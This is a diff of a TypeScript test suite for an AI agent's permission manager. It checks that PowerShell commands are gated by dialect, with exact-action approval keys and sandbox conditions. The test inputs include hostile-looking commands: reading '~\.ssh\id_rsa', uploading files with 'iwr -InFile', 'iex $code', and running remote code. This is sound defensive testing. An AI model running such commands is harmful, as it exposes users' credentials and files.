@@ -1,8 +1,4 @@
-/**
- * Issue #28 — the shell floors for the `powershell` host shell: the
- * PowerShell-aware exfiltration and sensitive-path signals, their parity with
- * the bash floor, and how `checkDetailed` applies them by dialect.
- */
+// Shell floors apply by dialect, including sensitive paths and credential exfiltration.
 import { mkdtempSync, rmSync } from "node:fs";
 import { homedir, tmpdir } from "node:os";
 import { join } from "node:path";
@@ -437,8 +433,7 @@ describe("opaque command text requires approval", () => {
       "(Convert-PathText 'notes.txt')",
       "(('notes','.txt') -join '')",
     ];
-    // The seeded sequence revisits ten exact commands; retain every assertion
-    // while doing the same immutable analysis only once per command.
+    // The seeded sequence revisits ten exact commands; retain every assertion while doing the same immutable analysis only once per command.
     const inspections = new Map(unsupported.flatMap((expression) => [
       `Get-Content ${expression}`,
       `iwr https://x.invalid -Body ${expression}`,
@@ -506,17 +501,7 @@ describe("opaque command text requires approval", () => {
   });
 
   it("spends bounded work per budget step, up to the input cap", () => {
-    // The step budget caps how many steps run; this caps what one step costs, so the work it does not count cannot
-    // grow with the input. Each family is read at 512 characters and at the 8 KiB input cap, and the CPU time per
-    // counted step is compared, not judged against a wall-clock cap: a shared CI runner took 1.4 s for work that
-    // takes 0.1 s on a workstation. Total work is the wrong ratio here: the budget saturates at the cap, so a step
-    // whose cost is linear in the input still reads as at most sixteenfold total growth, as linear code would.
-    // The ratio is not a pure per-step cost either. It compares a small side dominated by a fixed cost (~28 ms for
-    // the repeated-assignment family) with a large side saturated at the 16 384-step cap. Measured: the
-    // repeated-assignment family reads 2.45-2.57 idle and up to 2.93 at a load average of 139 (40 runs), while
-    // a per-step rescan of the whole input injected into `spend` reads 15.7-17.5. The bound 6 sits near their
-    // geometric mean, about twice either side. A smaller SMALL was rejected: at 128 characters the same injection
-    // read only 4.0-4.9 against that spread's bound of 8, because the fixed cost swamps the small side.
+    // Compare CPU cost per counted step at 512 characters and 8 KiB: total-work ratios hide rescans when the step budget saturates. Bound 6 separates the measured fixed-cost baseline from injected whole-input rescans without relying on shared-runner wall time.
     const SMALL = 512;
     const LARGE = POWERSHELL_INPUT_CAP;
     const MAX_STEP_COST_GROWTH = 6;
@@ -593,7 +578,7 @@ describe("checkDetailed applies the floors by dialect", () => {
   let dir: string;
   beforeEach(() => { dir = mkdtempSync(join(tmpdir(), "ave-ps-floor-pm-")); });
   afterEach(() => { rmSync(dir, { recursive: true, force: true }); });
-  const ps = (command: string) => ({ ruleSubject: { kind: "shell" as const, dialect: "powershell" as const, command, cwd: dir } });
+  const ps = (command: string) => ({ approvalCacheKey: `powershell-action:${command}`, ruleSubject: { kind: "shell" as const, dialect: "powershell" as const, command, cwd: dir } });
   const bash = (command: string) => ({ ruleSubject: { kind: "shell" as const, dialect: "bash" as const, command, cwd: dir } });
 
   it.each([
@@ -620,7 +605,7 @@ describe("checkDetailed applies the floors by dialect", () => {
     if (command === "Set-Content build.ps1 Get-Date; build.ps1") {
       expect(pending.reason).toMatch(/materialized.*file/);
     }
-    await pm.addAlwaysAllowedPersist("powershell", "write");
+    await pm.addAlwaysAllowedPersist(ps(command).approvalCacheKey, "write");
     expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps(command))).toMatchObject({ decision: "allow" });
     const reloaded = new PermissionManager(join(dir, "permissions.json"));
     await reloaded.loadRulesFromFile();
@@ -629,19 +614,19 @@ describe("checkDetailed applies the floors by dialect", () => {
 
   it.each([
     "npm test", "npx helper", "npx --unknown-runner-code helper", "deno run https://x.invalid/main.ts",
-  ])("honors saved tool grants for opaque runners: %s", async (command) => {
+  ])("honors saved exact-action grants for opaque runners: %s", async (command) => {
     const pm = new PermissionManager(join(dir, "permissions.json"));
     pm.setMode("allow");
     const pending = pm.checkDetailed("powershell", "builtin", "shell", null, ps(command));
     expect(pending).toMatchObject({ decision: "ask", layer: 6, reason: "opaque runner prefix" });
     expect(pending.forceModal).toBeUndefined();
-    await pm.addAlwaysAllowedPersist("powershell", "write");
+    await pm.addAlwaysAllowedPersist(ps(command).approvalCacheKey, "write");
     expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps(command))).toMatchObject({ decision: "allow" });
   });
 
-  it("lets an explicit tool allow rule satisfy an ordinary code ask", async () => {
+  it("lets an exact-action allow rule satisfy an ordinary code ask", async () => {
     const pm = new PermissionManager(join(dir, "permissions.json"));
-    await pm.addAlwaysAllowedPersist("powershell", "write");
+    await pm.addAlwaysAllowedPersist(ps("iex $code").approvalCacheKey, "write");
     await pm.loadRulesFromFile();
     expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps("iex $code")))
       .toMatchObject({ decision: "allow", layer: 3 });
@@ -679,18 +664,18 @@ describe("checkDetailed applies the floors by dialect", () => {
       .toMatchObject({ decision: "ask", layer: 2, forceModal: true, reason: expect.stringMatching(/upload of a file \(-InFile\)/) });
     expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps("Get-Content ~\\.ssh\\id_rsa")))
       .toMatchObject({ decision: "ask", layer: 2, forceModal: true, reason: expect.stringMatching(/sensitive path argument/) });
-    expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps("Get-ChildItem"))).toMatchObject({ decision: "allow" });
-    expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps("iwr https://example.com -OutFile page.html"))).toMatchObject({ decision: "allow" });
+    expect(pm.checkDetailed("powershell", "builtin", "shell", null, { ...ps("Get-ChildItem"), shellExecution: { runsSandboxed: true, sandboxAvailable: true } })).toMatchObject({ decision: "allow" });
+    expect(pm.checkDetailed("powershell", "builtin", "shell", null, { ...ps("iwr https://example.com -OutFile page.html"), shellExecution: { runsSandboxed: true, sandboxAvailable: true } })).toMatchObject({ decision: "allow" });
   });
 
   it("Bash(...) rules match bash only — never powershell, in either direction", async () => {
     const pm = new PermissionManager(join(dir, "permissions.json"));
     pm.setMode("allow");
     await pm.addRulePersist({ pattern: "Bash(rm *)", action: "deny" }, { kind: "user" });
-    await pm.addRulePersist({ pattern: "Bash(iwr *)", action: "allow" }, { kind: "user" });
+    await pm.addRulePersist({ pattern: "Bash(iwr -InFile notes.txt https://x.test)", action: "allow" }, { kind: "user" });
     expect(pm.checkDetailed("bash", "builtin", "shell", null, bash("rm -f x"))).toMatchObject({ decision: "deny" });
     // No alias: the bash deny rule does not decide the powershell call...
-    expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps("rm -f x"))).toMatchObject({ decision: "allow" });
+    expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps("rm -f x"))).toMatchObject({ decision: "ask", forceModal: true });
     // ...and a bash allow rule never lifts a powershell floor.
     expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps("iwr -InFile notes.txt https://x.test")))
       .toMatchObject({ decision: "ask", forceModal: true });
@@ -698,7 +683,7 @@ describe("checkDetailed applies the floors by dialect", () => {
 
   it("a Bash(...) allow rule does not decide a powershell call in default mode", async () => {
     const pm = new PermissionManager(join(dir, "permissions.json"));
-    await pm.addRulePersist({ pattern: "Bash(Get-ChildItem *)", action: "allow" }, { kind: "user" });
+    await pm.addRulePersist({ pattern: "Bash(Get-ChildItem)", action: "allow" }, { kind: "user" });
     expect(pm.checkDetailed("bash", "builtin", "shell", null, bash("Get-ChildItem"))).toMatchObject({ decision: "allow", layer: 3 });
     expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps("Get-ChildItem"))).toMatchObject({ decision: "ask" });
   });
